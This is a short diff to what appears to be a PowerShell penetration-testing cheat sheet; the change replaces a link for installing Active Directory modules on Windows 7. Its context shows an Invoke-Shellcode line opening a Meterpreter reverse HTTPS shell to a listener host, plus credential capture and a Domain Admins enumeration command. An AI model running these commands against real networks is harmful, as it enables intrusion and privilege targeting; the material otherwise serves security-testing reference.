@@ -69,7 +69,7 @@ Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost 192.168.1.10 
  ### Via https://www.trustedsec.com/uncategorized/powershell-reconnaissance/
  ### Setting Credentials 
  * **Command with arguments**: `$cred = Get-Credential`
- * **Notes**: These following commands require the Powershell Active Directory Modules to be installed. These can be downloaded for Win7 [here] (http://www.microsoft.com/en-us/download/details.aspx?id=7887) 
+ * **Notes**: These following commands require the Powershell Active Directory Modules to be installed. Steps to install for Win7 are detailed [here] (http://blogs.msdn.com/b/rkramesh/archive/2012/01/17/how-to-add-active-directory-module-in-powershell-in-windows-7.aspx) 
    
  ### Query to List "Domain Admins" 
  * **Command with arguments**: `Get-ADGroupMember -Credential $cred -server pwnt.com "Domain Admins"`
